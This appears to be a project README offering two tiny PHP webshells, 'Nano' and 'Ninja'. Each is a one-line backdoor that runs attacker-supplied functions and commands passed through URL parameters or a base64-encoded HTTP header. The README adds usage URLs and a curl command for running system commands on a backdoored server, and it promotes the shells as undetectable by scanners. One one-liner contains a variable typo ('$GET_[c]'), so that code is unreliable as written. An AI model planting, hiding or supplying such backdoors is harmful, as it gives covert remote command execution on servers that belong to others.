# nano
Nano is a family of PHP webshells which are code golfed to be extremely stealthy and efficient.\
Put it on watch maybe, I will continue to upload more webshells in here.

### Nano
```php
<?=$_GET[p]==_&&$_GET[f]($GET_[c]);
```
#### Features
- 35 bytes in size
- Can't be detected by static code scanners
- Supports authentication

#### Usage
`http://example.com/nano.php?f=function&c=command&p=password`

`f` is for function\
`c` is for command\
`p` is for password

For example, the code below will execute the `ls` command:

`http://example.com/nano.php?f=system&c=ls&p=password`

### Ninja
```php
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```
#### Features
- 93 bytes in size
- Fully Undetectable

#### Usage
This one a bit complex.\
Lets say you want to run `system(ls)` so write it as `system~ls` and then base64 encode it i.e. `c3lzdGVtfmxz`\
Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtfmxz`\
Now open your terminal and type the following command\
`curl -H 'x: xc3lzdGVtfmxz' http://example.com/backdoored.php`\
Too much work? You can use the [handler](https://github.com/s0md3v/nano/blob/master/handler.py) instead.

#### Everything Else
This is my first php thingy so if there's way to do what I did in a better way please let me know or open a pull request.\
